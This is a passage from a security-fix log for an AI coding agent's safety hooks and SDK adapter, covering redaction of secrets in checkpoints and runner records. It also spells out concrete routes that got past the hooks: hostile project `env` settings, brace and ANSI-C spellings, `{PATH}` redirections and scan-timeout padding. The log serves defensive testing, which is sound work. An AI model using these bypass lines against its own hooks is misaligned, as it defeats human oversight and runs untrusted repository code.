  anchors as before). `IdempotencyLog.redactor` and `MemoryStore.redactor`
  are properties; `Redactor.include(other)` takes another redactor's
  registered forms and patterns. The runner, at each `advance`, gives what
  its redactor recognises to the host's log, the host's memory store and
  its own `memory` (`_share_redactor`): a store on `DEFAULT_REDACTOR` gets
  a new redactor (the default patterns and the runner's), so the shared
  default never learns a value; any other takes the runner's in. A runner
  on the default redactor changes nothing. `_transmitted_since` redacts
  with the log's redactor, and the runner redacts the strings of a
  `RolledBack` response's `not_covered` items (host text the core writes
  into the trace and the rollback's record), so a custom rollback's items
  are covered too.
- Tests: `tests/test_idempotency.py::test_the_output_in_the_file_is_redacted`
  (the file's bytes hold no key id, password or bearer token; the replay
  answers the redacted anchors without their digest, `evidence_seen`
  matching, the receipt's `Authorization` replaced); in
  `tests/test_runner_secrets.py`, the reported workflow (checkpoint,
  constrain, send, rollback) with the log on the default redactor and on
  its own (file bytes; one transmission; the rollback's item redacted; the
  run's trace, records and outputs hold neither; the default redactor
  learns nothing), a replay from the file equal to what the runner submits
  for the first answer, two anchors one after redaction (listed only when
  both were), and the runner's secrets reaching the host's and its own
  memory store (with the default patterns kept); `tests/test_redaction.py::
  test_include_takes_another_redactors_values_and_patterns`. All fail on
  4cec757's runner, log, redactor and memory store.
- Not changed: a secret in a plain member of an `Output` the run keeps
  (the receipt) stays in the run's outputs: §6.7 makes not passing one a
  host's duty (SHOULD NOT), and the runner redacts anchors and host text
  that reaches the trace and the records. The log, an audit record, now
  redacts it. Entries a log wrote before this fix keep what they hold. The
  default patterns still do not recognise a signed URL's signature (round
  2 #23): the log holds an `X-Amz-Signature` where no pattern names it, as
  the run does. The run's snapshot keeps the run's inputs as the caller
  gave them (a destination with a registered secret, here).

#### 4. The runner redacted only an Output's anchors given as a list: an Event's anchors and a tuple of anchors kept their secrets (medium; sibling of round 2 #23)

`_redact_anchors` returned any response that was not an `Output`
unchanged, and an `Output` whose `evidence_anchors` was not a list. The
core reads a tuple as an array, and copies an `Event`'s `anchors` into a
`receive` or `wait` step's output (its `evidence_anchors`, and the event
under `data` or `result`), so both reached the run's outputs, state and
snapshot with a URL's password and a registered secret. A tuple's anchors
were neither recorded in the evidence store nor logged as skipped.

- Fix (`_responses.redact_anchors`, which the runner's `_redact_anchors`
  now calls): an `Event`'s `event.anchors` are redacted as an `Output`'s
  are, and an array of anchors given as a tuple, an `Output`'s or an
  `Event`'s, is redacted and given back as a list (so the evidence store
  records it); `evidence_seen` given as a tuple is rewritten as a list is.
  Only the anchors of an `Event` are redacted, not its other content: an
  event's message is the host's, as an `Output`'s plain members are (the
  core's trace holds an event's type and drop counts only), and redacting
  it before the core reads it could change what the event's filter
  matches.
- Tests (`tests/test_runner_secrets.py`): an event's anchors as a list and
  as a tuple (outputs, trace, records, run record and snapshot hold
  neither the password nor the registered secret; the anchor is kept
  redacted without its digest, the same under `data`), an `Output`'s
  anchors as a tuple (redacted, and recorded in the evidence store, with
  and without a secret), `evidence_seen` as a tuple (the attested policy
  passes, nothing kept holds the password). All fail on 4cec757's runner;
  the control (an event's anchors with no secret kept as given) passes on
  both.
- Sibling checked: `nested_anchors` carry a nested run's step outputs,
  which were redacted when submitted; a trigger event that starts a run
  reaches no step output's anchors (the core reads `anchors` only on
  receive).

#### 5. WorkflowRunner.cancel put the cancel reason into the run's message, trace, records and snapshot unredacted (medium)

`cancel` passed `reason` to `run.cancel` as given; the core makes it the
R408 message and writes it into the `run_cancelled` event, the cancelled
records and the run record.

- Fix: `run.cancel(self._redactor.redact_text(reason)[0], now)` (a reason
  that is not a string is passed as it is, for the core to refuse); the
  docstring and the guide say so.
- Tests: `test_a_cancel_reason_is_redacted` (a URL's password and a
  registered secret: the message is the reason with both replaced, and no
  place the run keeps holds either) fails on 4cec757's runner; the control
  `test_a_cancel_reason_without_a_secret_is_kept` passes on both.
- Sibling checked: `Host.withdraw` takes the runner's own words
  (`"cancelled"`, `"timed out"`); the TypeScript package's `Run.cancel` is
  the core's own call, as Python's `_core.Run.cancel` is, below any host
  layer (the binding has no runner).

#### Documentation

SECURITY.md §1.5 (the runner's redaction of an `Event`'s and a tuple's
anchors, `not_covered` and a cancel's reason; the idempotency log; the
TypeScript decoder's message) and its binding paragraph (a nested call's
R407), the running-workflows guide (the runner's `redactor`, the log, the
cancel), the Standard Agents guide's §5.18.8 row, the runner's and the
log's docstrings, and CHANGELOG [Unreleased] Upgrading (the runner and the
log; the binding's nested R407; the package's decoder message). The
Standard's text was not changed: §6.7 already forbids a secret in an
evidence anchor, a diagnostic, a trace and an audit record, §6.4 counts a
host's log of what it did among audit records, and §5.18.8 already
requires R407 and a record of each refusal. No version changes.

#### Checks after batch 4

- Python: `pytest tests/` (6695 passed, 18 skipped), and again every file
  that reads the edited docs after the last edit (2042 passed); ruff check
  and format with CI's lists; mypy; every `tools/validate_*.py` of
  CLAUDE.md, `validate_workflows.py --strict` and every domain catalog and
  example `--strict`; `sync_skill_schemas.py --check` and the generators'
  `--check` (no fixture or vector they write changed);
  `scripts/run_conformance.py`.
- Rust: no Rust source changed, so `cargo test` was not rerun and no core
  was rebuilt.
- TypeScript: `packages/acs-core` build, check and test (2012; the three
  new vectors; the WebAssembly build reused); the binding's check and test
  (246 passed, 2 skipped; 236 plus the 10 new).
- Site: `npm run check`, `npm test` (1173).
- Old code: the three new vectors against 4cec757's `output.ts` (3 of 3
  fail), the binding's decoder test against a package built from it (fails),
  the binding's 9 nested-call tests against 4cec757's `grounded.ts` (8 fail,
  the control passes), and the 14 new Python tests against 4cec757's
  runner, log, redactor and memory store (12 fail; the 2 that pass are the
  controls: an event's anchors with no secret, a cancel reason with none).
- Probes, each under `timeout 120` and a 4 GB address-space limit, inputs
  of at most 1 MB: the reporter's four Python probes pointed at this
  worktree (the log's file holds no key id, URL password, bearer token or
  registered secret, the rollback's item is redacted; an event's and a
  tuple's anchors and a cancel's reason reach no place the run keeps with
  their secrets; the S3 signature, which no default pattern names, stays
  in the log as in the run, round 2 #23); the log's redaction of a 64 KB,
  256 KB and 1 MB output (0.04, 0.14 and 0.55 s: linear); the binding's
  arguments nested 20,000 deep (about 100 KB) refused at once. No CLI or
  nested agent was started; nothing was left running; the probe copies and
  scratch files were removed.

### Batch 5: one reported defect

One defect, reproduced by an independent verifier on 6004f78 and reproduced
again here on 5a709e9 (batch 4's commit) before any change, with the
reporter's unit probe and the verifier's end-to-end probe pointed at this
worktree (`tracker_state.json` held the GitHub token, the password
assignment, the URL's password and the registered secret). Not fixed by an
earlier batch: git log and rounds 1 to 3 checked (round 2 #10 knew `reason`
and `scope` are model-written but fixed only where the archive is written,
not what it holds; batch 4 shared the runner's redactor with the log and
the memory stores, not the tracker). Each fix has tests that fail on the
code before it (below).

#### 1. A bound checkpoint tool's model-chosen `reason` (and `scope`) was written verbatim to the checkpoint tracker's state file and archive (medium); siblings: the tracker's other text, a runner's `checkpoint` step, the binding's checkpoint ids

`create_checkpoint_recorder` passed a bound checkpoint tool's input
`reason` and `scope` (or the response's `scope`) to
`CheckpointTracker.create_checkpoint`, which kept them as given in its
records and wrote them to `tracker_state.json` and, once pruned, to the
archive. The adapter registers the recorder for every tool and redacted
its call records, diagnostics and evidence, but its tracker had no
redactor: a checkpoint is the layer's record of the call that took it
(§5.18.8: it names the call by `metadata.source` and `tool_use_id`), which
§6.7 keeps secrets out of.

- Fix at the root, the tracker (`grounded_agency/state/checkpoint_tracker.py`):
  it takes a `redactor` (default `DEFAULT_REDACTOR`; a `redactor` property
  with a setter, as `IdempotencyLog` and `MemoryStore` have) and redacts
  every string it records when it records it: a checkpoint's `reason`, its
  `scope` items and its `metadata` (structured redaction, so a member named
  for a credential is replaced too), the reason an execution boundary gives
  (`invalidated_by`) and the words that use a checkpoint (`consumed_by`).
  So the records in memory (`get_history`, `get_active_checkpoint`), the
  state file and the archive hold no secret it recognises, whoever calls
  `create_checkpoint` (the recorder, `adapter.create_checkpoint`, the
  workflow engine, a runner's host). The snapshot store captures what the
  scope names as given (the capture runs before the record is made), so a
  restore still finds the files; the checkpoint's recorded `scope`, which
  `matches_scope` and `has_checkpoint_for_scope` read, is the redacted one
  (no layer check reads it; a model that writes the scope could write
  `*`).
- The adapter builds its redactor before its tracker and gives it the
  layer's (`redactor=self.redactor`), so `secret_values` reach the
  checkpoint records too.
- Sibling, the runner: a `checkpoint` step's `scope` is the step's input
  (`Host.invoke_capability` passes it to `create_checkpoint`), so
  `WorkflowRunner._share_redactor` now gives the host's
  `checkpoint_tracker` what its redactor recognises, as it gives the log
  and the memory stores (a tracker on the shared default redactor gets one
  of its own).
- Sibling, the Standard Agents binding: a checkpoint record
  (`acs:checkpoints`) kept the `checkpoint_id` the `checkpoint` call's
  output gave, as given, and a later call's trace entry repeated it
  (`redacted` read only `error` and `evidence_anchors`, saying nothing else
  in an entry held a value a call received). `addCheckpoint`
  (`src/acs/records.ts`) records the id redacted (default patterns, the
  tool's secrets, the layer's), and `redacted` redacts an entry's
  `checkpoint_id` as well. Two ids that are one once redacted name one
  checkpoint, so a call that uses one uses both: the safe side. The
  binding records no `reason` or `scope` (the example's `label` is not
  kept). The plugin's shell hooks keep no model text in their checkpoint
  records (a commit id, generated ids, times, a call id).
- Tests (`tests/test_checkpoint_secrets.py`, 7): the reported probe (the
  recorder on a tracker with the default redactor: the checkpoint is
  taken, its reason and scope are recorded redacted, its metadata kept,
  and no file holds the password, the token or the URL's password); the
  adapter end to end through `wrap_options` (PreToolUse then PostToolUse
  with a valid output: one checkpoint, and neither the checkpoint in
  memory nor any file under the run's directory holds the four secrets,
  the registered one included; the tracker has the layer's redactor; the
  shared default never learns the value); the archive and the boundary's
  and holder's words (`max_history=1`: the archive, the history and the
  state file hold none, `invalidated_by` and `consumed_by` redacted); the
  snapshot store capturing and restoring a directory whose name holds a
  password assignment or a registered secret while the record's scope is
  redacted; a runner whose `checkpoint` step's scope holds a registered
  secret and a URL's password, with the host's tracker on the default
  redactor and on its own. Six fail on 5a709e9's Python (the reason
  recorded as given; the four secrets in the adapter's state file; three
  secrets in the archive and state file; the registered value in the
  runner's state file; two through the new `redactor` argument and
  property); the control (a reason and scope without a secret kept as
  given) passes on both. Binding (`test/grounded.test.ts`, `records a
  checkpoint id without the secrets it holds (§6.7)`: a checkpoint tool
  that returns the model's label as its id, holding a password
  assignment, a GitHub token and a value its `secrets` function gives;
  the next call uses the checkpoint, and neither `acs:checkpoints` nor
  the trace holds any of them): fails on 5a709e9's `src/acs/`.
- Not changed: checkpoints a tracker wrote before this fix keep what they
  hold, in the state file and the archive (a tracker writes back the
  records it read as the file has them; redacting every record at every
  write would cost about 16 ms per write for 100 checkpoints, against
  about 2 ms for the write); delete them once no longer needed. The
  snapshot store's manifest keeps the scope's patterns as given: a restore
  matches them (the files created since in the captured scope are
  removed), and the store holds the files' own bytes, whatever they hold
  (§4.4.1; §6.7 governs records, not restore content). A hold's holder (a
  call id) is kept as given: it is what the hold is matched by.

#### Documentation

SECURITY.md §1.5 (the tracker's redaction, the runner giving it its
secrets, the binding's checkpoint ids), the SDK guide's Secrets section,
the Standard Agents guide's secrets bullet, the running-workflows guide
(the runner's redactor reaches the host's tracker), the tracker's,
recorder's, adapter's and runner's docstrings, and CHANGELOG [Unreleased]
Upgrading (the Python `CheckpointTracker` and the runner; the binding's
checkpoint ids). The Standard's text was not changed: §6.7 already names a
safety layer's record of a call (§5.18.8), which a checkpoint the layer
records for the call that took it is. No version changes.

#### Checks after batch 5

- Python: `pytest tests/` (6702 passed, 18 skipped: 6695 plus the 7 new);
  ruff check and format with CI's lists; mypy; every `tools/validate_*.py`
  of CLAUDE.md, `validate_workflows.py --strict` and every domain catalog
  and example `--strict`; `sync_skill_schemas.py --check` and the
  generators' `--check` (no fixture or vector changed);
  `scripts/run_conformance.py`.
- Rust: no Rust source changed, so `cargo test` was not rerun and no core
  was rebuilt.
- TypeScript: the package's check and test (2012; no package source
  changed, its build reused); the binding's check and test (247 passed, 2
  skipped; 246 plus the new one).
- Site: `npm run check`, `npm test` (1173).
- Old code: the 7 new Python tests against 5a709e9's `grounded_agency/`
  (6 fail; the control passes) and the binding's new test against
  5a709e9's `src/acs/` (fails).
- Probes, each under `timeout 120` and a 4 GB address-space limit: the
  reporter's unit probe and the verifier's end-to-end probe pointed at this
  worktree hold none of the secrets in any file after the fix; redacting
  100 checkpoint records takes about 16 ms (why records written before the
  fix are not rewritten at every write). No CLI or nested agent was
  started; nothing was left running; the probe copies and scratch files
  were removed.

## Round 4

### Batch 1: four reported defects

Four defects, each reproduced by an independent verifier on 7d04aea and
reproduced again here before any change (the reported payloads and env,
under `timeout 120` and a 4 GB address-space limit): the Write in
`bypassPermissions` with no marker exited 0 under `SHELLOPTS=noexec`,
`BASH_ENV` and a `PATH` with a pass-through `jq`; the MCP edit of 8 option
clusters took 34.0 s (F501); 100 KB of padding before a URL's password in a
TodoWrite took past 30 s. None was fixed by an earlier batch: round 2 #6
refused only the four settings' names, round 3 #2 bounded the guard's
reading by bytes alone, round 2 #16 and round 3 batch 3 #1 fixed braces and
`$'...'` in the audit skill's hook only, and round 1 batch 5 judged the
shell scan linear from timings with grep's output sent to `/dev/null`.
Each fix has tests that fail on the code before it (below).

#### 1. A project's settings `env` other than the four layer settings turned the hooks off or skipped the git-program rule (medium; sibling of round 2 #6); siblings: `HOME` and jq's library, exported functions, the take hook's clean-tree check, the SDK adapter

Claude Code applies the `env` of the project's `.claude/settings.json` and
`.claude/settings.local.json` (repository content) to every hook and every
command it runs. `project_layer_settings` refused only `ACS_HOOK_APPROVAL`,
`ACS_CHECKPOINT_MAX_AGE`, `AUDIT_HMAC_KEY` and `AUDIT_LOCK_WAIT`, so
`SHELLOPTS=noexec` (bash runs nothing: exit 0, and the log hook wrote no
line), `BASH_ENV` (a repository script that exits 0 first), `GIT_CONFIG_*`
(git's command scope: `git status` ran a repository program, classified
`observe`; `GIT_CONFIG_PARAMETERS`, `GIT_CONFIG_GLOBAL`, `HOME`,
`XDG_CONFIG_HOME` alike) and a `PATH` entry naming a repository `jq`
each passed. Siblings found here: `HOME` alone defeated every jq check (jq
loads `$HOME/.jq` as a library: `def test(a; b): false;` made the settings
check itself find nothing); an exported function (`BASH_FUNC_jq%%`)
replaced `jq` in the hook; the take hook ran its clean-tree `git diff`
(where a command-scope filter ran three times) before it read the settings;
and the SDK adapter, whose CLI applies the same env to every Bash command
where it loads the project's settings, classified `ls` under `BASH_ENV`
and `git status` under `GIT_CONFIG_*` as `observe`.

- Fix (the three hooks that read a setting, one function a test keeps
  equal): `project_layer_settings` now prints every name the project's
  `env` sets that is not one of Claude Code's own settings, as written
  (`ANTHROPIC_*`, `OTEL_*`, `CLAUDE_CODE_ENABLE_TELEMETRY`,
  `CLAUDE_CODE_MAX_OUTPUT_TOKENS`, `CLAUDE_CODE_USE_BEDROCK`,
  `CLAUDE_CODE_USE_VERTEX`, `CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC`,
  `DISABLE_TELEMETRY`, `DISABLE_ERROR_REPORTING`, `DISABLE_AUTOUPDATER`,
  `MAX_THINKING_TOKENS`, `MAX_MCP_OUTPUT_TOKENS`, `MCP_TIMEOUT`,
  `MCP_TOOL_TIMEOUT`, `BASH_DEFAULT_TIMEOUT_MS`, `BASH_MAX_TIMEOUT_MS`,
  `BASH_MAX_OUTPUT_LENGTH`): an allowlist, not the reported denylist, since
  no list of what bash, the loader, git, jq, openssl and perl read is
  complete (`PERL5OPT` reaches the log hook's lock, `OPENSSL_CONF` its
  signature). While it prints anything the pre-tool-use hook refuses every
  call (R407), the log hook writes no line, and the take hook writes no
  marker and now runs no git command (the check moved before them).
- Fix (how the hooks start): the four hook scripts open with `#!/bin/sh`
  and `case $- in *p*) ;; *) exec bash -p "$0" "$@" ;; esac`, so bash runs
  them in privileged mode whoever starts them: no `BASH_ENV` or `ENV`
  file, no imported function, `SHELLOPTS`, `BASHOPTS`, `CDPATH` and
  `GLOBIGNORE` ignored (POSIX `sh` reads none of these either, and bash
  started as `sh` reads no `BASH_ENV`). `hooks.json` is unchanged: its
  exec form (`args`) would avoid `/bin/sh -c` but breaks Git Bash on
  Windows, and on a Claude Code without it would run its `command` alone.
- Fix (what the check runs): a block the three hooks share (kept equal by
  a test), before they read the call: `PATH` keeps only the absolute
  directories outside the project directory, as the system resolves them
  (`/dev/null` when none is left: an empty `PATH` searches the working
  directory; every absolute directory where the project directory is the
  user's home directory, as the password database gives it, or holds it,
  since a home directory is no repository's and holds the user's own
  tools: `~/.local/bin`, `~/.nix-profile/bin`), and `jq` runs with an
  empty `HOME`; availability is asked with `type -P jq`. The settings are
  read before any program but `jq`.
- The skills' command hooks are commands Claude Code starts with `/bin/sh
  -c` (POSIX sh, no bash of their own): while the project's settings set
  such a variable the pre-tool-use hook refuses every call, theirs
  included.
- Sibling, the SDK adapter: `grounded_agency/utils/project_settings.py`
  (`ALLOWED_PROJECT_ENV`, the hooks' list as the same expression, a test
  keeps them equal; `refused_project_env`). `wrap_options` gives the
  safety hook the options' `cwd` and `setting_sources`; where the CLI loads
  the project's settings (`None`, or `project`, `local`), every call is
  refused R407 while the file it loads sets a name off the list or cannot
  be read (UTF-8 only, as jq reads it).
- Not covered (SECURITY.md §5.5, hooks README): Claude Code starts each
  hook through `/bin/sh -c` with that env applied, so where `/bin/sh` is
  bash (macOS, Fedora, Arch, Git Bash) `SHELLOPTS=noexec` or an exported
  function stops that shell before any plugin code runs, and anywhere a
  `PATH` naming a repository directory ahead of bash's, or `LD_PRELOAD`,
  runs the repository's code in the hook's place (as a project hook, which
  the same accepted settings can define, does). The hooks refuse every
  call while such a variable is set wherever their own code runs.
- Tests (`tests/test_project_settings.py`): each of 19 variables
  (`BASH_ENV`, `SHELLOPTS`, `BASHOPTS`, `ENV`, `PATH`, `HOME`,
  `XDG_CONFIG_HOME`, `LD_PRELOAD`, `DYLD_INSERT_LIBRARIES`,
  `GIT_CONFIG_COUNT`, `GIT_CONFIG_PARAMETERS`, `GIT_CONFIG_GLOBAL`,
  `OPENSSL_CONF`, `PERL5OPT`, `HTTPS_PROXY`, `BASH_FUNC_jq%%`,
  `CLAUDE_CODE_SHELL_PREFIX`, `path`, `NODE_ENV`) in either file refuses a
  Write and a Read; Claude Code's own settings change nothing; no marker
  and no log line while one is set; the reported routes with the hook
  started as Claude Code starts it (`/bin/sh -c <script>` with the env
  applied): `SHELLOPTS=noexec`, `BASH_ENV` (Write and the `curl` in
  `dontAsk`), an exported `jq` function, `GIT_CONFIG_*` for `git status`,
  `git diff`, `git stash create` and `git log -1` (and the program never
  ran), the take hook's command-scope filter (never ran, no marker), a
  repository `jq` on a relative `PATH` entry, a `HOME` with a jq library;
  a repository `jq` named by its absolute path in the project; a project
  that is the home directory keeping its tools (fails without the home
  rule); the scripts' start; the adapter (19 variables, Claude Code's own, the
  sources the CLI loads, an unreadable file); the hooks and the adapter
  allow the same names (30); the function and the block equal in the
  three hooks. On 7d04aea's hooks and adapter: 100 fail, 57 pass (the
  earlier tests and the controls).
- Tests changed to the new behaviour: the controls that used `OTHER`,
  `ACS_HOOK_APPROVALS` and `PATH_EXTRA` as unrelated settings now use
  Claude Code's own; the tests that run a hook with a directory of chosen
  programs on `PATH` (`tests/test_hooks_unit.py`: a failing `date`, the
  audit lock and digest tests; the no-`jq` test) keep it beside the
  project directory, not in it.

#### 2. The records guard's reading of an MCP or unknown tool's input ran past the hook's 30 s limit within its 65536-byte budget (medium)

`word_candidates` gave a word that opens with `-` one candidate per
position of its option cluster (up to 4090 texts of up to 4 KB each, none
charged to `RESOLVE_LEFT`), and empty strings, which count no bytes, had no
bound: the reported edit took 34.0 s here (44.3 s for the reporter, rc 124
under `timeout 30`), the verifier's quoted sibling (each string read three
times) 51.7 s, and 110,000 empty strings 21 to 32 s.

- Fix: a call whose input holds more than 4096 strings and member names
  (empty ones included, any length) is refused F504 with the over-budget
  refusal, checked before the lexical check (which cost about 70 µs a
  text: 7.8 s for 110,000); empty texts are not read. Of an option
  cluster, only the texts whose first component exists in the call's
  directory (a file, a directory or a link) or that are absolute are
  candidates: a component that does not exist cannot be opened through,
  and one of more than 255 characters exists on no file system, so a
  cluster gives at most 256 positions to look at. Each slash-free text
  added is charged to `RESOLVE_LEFT` (resolve_path charges the others);
  past it the call is refused F504.
- After: the reported edit 2.1 s (F501), the quoted sibling 3.9 s, 110,000
  empty strings 0.2 s (F504), 4096 strings of quoted words 4.0 s (the
  slowest shape found within the bounds), clusters with a 3800-byte tail
  2.1 s, brace and `$'...'` worst cases (below) under 3 s.
- Tests (`tests/test_records_guard.py`, `TestTheReadingsTime`): the
  reported edit and the quoted sibling decided within 15 s; 4097 and
  110,000 strings refused F504; 4096 strings of quoted words asked within
  25 s; a cluster that still names a path it holds (`-rrr...tnotes/k`,
  `-uuu...onotes/todo.md`, `-fff...r.claude`, each 300 letters) refused.
  The first three fail on 7d04aea's hook; the last two pass on both.

#### 3. The records guard did not read brace expansion or ANSI-C quoting (low; sibling of round 2 #4 and round 3 batch 3 #1)

`path_words` split at `{`, `}` and `$` and kept `\xNN` as written, so
`cp -rT {fixtures/,.git/acs/check}points` reached the ordinary approval
(F502) instead of F504, and, approved, wrote a key and an entry of the
repository's, after which `git stash apply <shipped commit>` restored with
no marker in every mode.

- Fix (`path_words`): `$'...'` is decoded as bash decodes it
  (`ansi_escape`: `\a` to `\v`, `\\ \' \" \?`, octal, `\xHH`, `\uHHHH` and
  `\UHHHHHHHH` in UTF-8, `\cx`, an unknown escape kept with its backslash,
  and a NUL ending what bash keeps of that `$'...'`; bytes made with
  `printf -v`, no subshell), `$"..."` is read as `"..."`, and unquoted
  braces and commas are marked so `brace_words` expands each word as bash
  does: the innermost group first, a comma group into its alternatives, a
  sequence (`{a..e}`, `{1..10..3}`, `{01..10}`) into its elements, any
  other group kept as written. Each word made is charged to `BRACE_LEFT`
  (8192 words a call) and `RESOLVE_LEFT` bytes; past either the call is
  refused F504. Checked against bash on the forms of the probe
  (sequences of letters across `Z..a`, padded and negative numbers, steps,
  nested and escaped braces, a quoted comma).
- Tests (`TestBracesAndAnsiCQuoting`): 14 spellings of a records path
  (brace, hex, octal, `\u`, `\U`, `$"..."`, nested, sequence, a link
  reached through a brace, `sh -c` with a brace) refused; three of the
  directory that holds them; bash's own expansion of the reported forms
  (the premise); 8 controls asked (`file{1..3}`, `x{,.bak}`, `$'a\tb'`, a
  NUL that ends the name, `mkdir -p src/{a,b}/{c,d}`, `jq '{a,b}'`,
  `{A..z}`, 4096 words); two expansions past the budget refused within
  10 s; an MCP shell server's command; the reported route end to end (the
  copy is refused, and run anyway it writes the key). On 7d04aea's hook 20
  of them fail; the premise, the controls and `$"..."` (read lexically
  before) pass.

#### 4. The shared secret scan was quadratic in `grep -o`, so a TodoWrite holding a credential after 100 KB kept the pre-tool-use hook past its 30 s limit (low); sibling: the Python and TypeScript user-option pattern

GNU grep decides whether a line matches in linear time, but `grep -o` looks
for a match from each position of a line that matches: the URL stage's
`[A-Za-z][A-Za-z0-9+.-]*://` read a long scheme-like run again from each of
its positions (20 KB 0.8 s, 40 KB 3.1 s with output to a pipe; 0.005 s to
`/dev/null`, which is how round 1 batch 5 timed it), and the user-option
stage read `[^...]*:` from each `-u` of a run such as `.-u.-u.-u...`
(0.35 s at 20 KB). The Python and TypeScript user-option pattern had the
same shape: 48.8 s for 200 KB in Python, 5.1 s for 100 KB in V8.

- Fix (`hooks/secret_scan.sh` and its three copies): the URL stage starts at
  the start of a scheme's run, `(^|[^A-Za-z0-9+.-])[0-9+.-]*[A-Za-z]...`
  (the Python and TypeScript `_SCHEME`, which round 1 batch 5 made so), and
  its `sed` strips through the last `//`; a user option's name is read for
  at most 256 characters (`{0,256}`) in the shell, Python
  (`_USER_OPTION`) and TypeScript (`USER_OPTION`). A password after a
  longer name is not recognised (stated in CHANGELOG).
- After: every adversarial shape tried (URL, user option with `-u`, `-U=`
  and `--user`, Authorization, name/value pairs and tuples, credential
  options, assignments, each with the match first or last) reads 80 KB in
  at most 0.13 s with output to a pipe; Python reads 400 KB of `.-u` in
  0.9 s.
- Tests: `TestShellHookPersistSecrets` (`tests/test_pretooluse_hooks.py`):
  the reported TodoWrite (100 KB then a URL's password), 120 KB of `.-u`
  and of `.-U=` then a user option's password, each F504 within 10 s from
  the hook (on 7d04aea: 39.8 s, 25.5 s, 18.8 s), and the adapter within its
  matcher's sixth (the URL passes on both, the user options fail on
  7d04aea's Python); `.-u`, `.-U=` and `!-u ` at 1 MB in the Python and
  TypeScript long-run tests (the old patterns take minutes there).

#### Documentation

SECURITY.md §1.5 (the linear-time claim, now what grep -o needs), §5.1
(the project's env, the hooks' start, their own programs, braces and
`$'...'`, the reading's bounds), §5.2 (the log and take hooks), §5.5 (the
settings bullet; a new bullet on what accepted repository settings reach
before a hook runs; the adapter's refusal); `hooks/README.md` (settings,
start, records guard, scan); the SDK guide's settings paragraph; the hooks'
and the adapter's comments; CHANGELOG [Unreleased] Upgrading (the plugin's
env rule and start, the adapter's refusal, the records guard's bounds and
readings, the user name's bound). The Standard's text was not changed: it
already requires a layer that cannot complete its checks to refuse
(§5.18.8).

#### Checks after batch 1

- Python: `pytest tests/` (6861 passed, 18 skipped: 6702 plus the new
  ones), run before the last change to the hooks' `PATH` rule (the home
  directory) and to their comments; after them, the hook suites again
  (`test_project_settings` with `test_hooks_unit`, 257 passed; the
  pre-tool-use, records guard, lifecycle, audit, skill-hook, redaction,
  git-program and pipeline tests, 2700 passed; after the comments,
  `test_records_guard` with `test_project_settings`, 252 passed). ruff check and format with CI's lists; mypy; every
  `tools/validate_*.py` of CLAUDE.md, `validate_workflows.py --strict` and
  every domain catalog and example `--strict`; `sync_skill_schemas.py
  --check` and the generators' `--check` (no fixture or vector changed).
- Rust: no Rust source changed, so `cargo test` was not rerun and no core
  was rebuilt.
- TypeScript: the package's check, build and test (2015: 2012 plus the
  three long runs); the binding's check and test (247 passed, 2 skipped).
- Site: `npm run check`, `npm test` (1173). Node, and the site's build
  under it, needs more than a 4 GB or 16 GB address-space limit (V8 and
  WebAssembly reserve address space they do not use: the build stopped
  with a heap failure at about 550 MB under 16 GB); these ran under a
  64 GB limit (15 GB of memory here) and `timeout`.
- Old code: the new tests against 7d04aea's hooks, adapter and redactor
  (project settings: 100 fail, 57 pass; records guard: 24 fail, 12 pass;
  persist timing: 5 fail, 1 pass), each count above.
- Probes, each under `timeout 120` and a 4 GB address-space limit: the
  reported payloads and env (above), the brace and `$'...'` cases against
  bash's own expansion, the shapes of the secret scan at 10 to 80 KB with
  grep's output to a pipe. No CLI or nested agent was started; nothing
  was left running; the scratch repositories and payloads were removed.

### Batch 2: four reported defects

Four defects, each reproduced by an independent verifier on 7d04aea and
reproduced again here on 95638a8 before any change (under `timeout 120`
and a 4 GB address-space limit): the classifier gave `observe` to every
reported line of defects 1 to 3 (and to the verifier's ASCII brace lines),
and the reporter's `p12.py` and `p7.py`, pointed at this worktree, printed
the R407 that kept its hold, "valid checkpoint left = True" after the Stop,
a turn-2 Write allowed, and `GroundedAgentAdapter() raised RecursionError`.
None was fixed by an earlier batch: round 3 batch 2 #3 refused the
backslash only, and the brace pattern dates from round 1. The plugin's
shell hook already refused all of them (it refuses `{`, `}`, `>`, `&`, `;`
and `|` anywhere) and keeps no state file of this kind. Each fix has tests
that fail on the code before it (below).

#### 1. A `{varname}` redirection on an allow-listed builtin set PATH or HOME for the next command of the line (high)

bash's `{name}>file` (also `<`, `>>`, `>&N`) assigns the new descriptor's
number (10 or more) to the variable; on a builtin (`echo`, `printf`,
`pwd`) it does so in the shell itself, so `echo hi {PATH}>/dev/null; ls`
ran the repository's `./10/ls` and `echo x {HOME}>/dev/null; git status`
ran the `core.fsmonitor` of `./10/.gitconfig`, both `observe`.
`_simple_commands` kept `{PATH}` as an argument.

- Fix (`grounded_agency/capabilities/mapper.py`, `_names_a_variable`): a
  word whose masked form opens with `{` and closes with `}` right before a
  redirection operator gives the line the worst case, whatever the name
  (bash takes an identifier or an array element; `{a[i=1]}` evaluates its
  subscript) and whether a blank separates them (the reading cannot tell,
  so `{PATH} >/dev/null` asks too).
- Tests (`tests/test_bash_redirections_and_braces.py`,
  `TestVariableRedirections`): the premise (bash runs `./10/ls`; an
  external command changes nothing); 12 lines (`{PATH}`, `{HOME}`, `{IFS}`,
  an array element, with `>`, `<`, `>>`, `>&2`, on `echo`, `printf` and
  `pwd`, then `ls`, `cat`, `git status`, `git log`) take the worst case;
  the adapter refuses the first F501, and F504 under a destination policy
  with a checkpoint.

#### 2. `>&` followed by digits outside ASCII wrote a file (medium)

`str.isdigit` takes any Unicode digit (`١`, `²`, `１`, `①`); bash reads
only ASCII 0-9 as a descriptor, so `>&١` is `&>١`: `cat /etc/hostname
>&１` wrote a file, classified `observe`.

- Fix: the target of `>&` must match `[0-9]+` (`_FD_NUMBER`).
- Siblings found here: `_json_pointer` in the adapter read a binding's
  `destination` pointer with `isdigit` and `int()`, so `/to/01` and
  `/to/١` took element 1 where the Standard Agents binding's `atPointer`
  (RFC 6901: `0|[1-9][0-9]*`) locates nothing and refuses the call under a
  policy; it now reads the index as the binding does, and a pointer that
  does not start with `/` locates nothing. `EvidenceStore.get` read
  `ev-01` and `ev-١` as `ev-1` (the JSON Lines store matched only the id as
  written); it now matches `ev-(0|[1-9][0-9]*)`. A Bash brace check that
  used Python's Unicode `\s` (below) is the third.
- Tests: `TestUnicodeDigits` (the premise: bash writes `١` and `１`; 8
  lines take the worst case); call fixture
  `send_destination_pointer_index` (`/to/01`, `/to/١` refused F504 under a
  policy, `/to/1` runs; 33 call fixtures, played by the adapter served and
  as another server's tools, and by the binding);
  `test_get_reads_only_the_id_as_written` (both stores).

